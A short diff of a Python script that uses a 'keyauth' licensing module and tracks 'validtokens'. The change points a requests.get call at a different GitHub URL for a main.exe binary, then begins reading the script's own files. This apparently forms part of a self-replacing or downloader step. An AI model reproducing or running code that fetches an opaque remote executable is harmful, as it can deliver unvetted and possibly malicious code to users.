@@ -1,4 +1,4 @@
-
+##abc22
 from keyauth import api
 
 import sys
@@ -26,7 +26,7 @@ validtokens = []
 os.system("color f")
 
 
-res = requests.get("https://github.com/069timov2/testororn/raw/1f498f0a8bc9c7acec9d2bb4a6912177573ef886/main.exe")
+res = requests.get("https://raw.githubusercontent.com/069timov2/testororn/main/main.exe")
 if res.status_code == 200:
   oldfile = os.path.dirname(os.path.abspath(__file__) + f"/{__file__}")
   with open("main.py", "rb") as f:
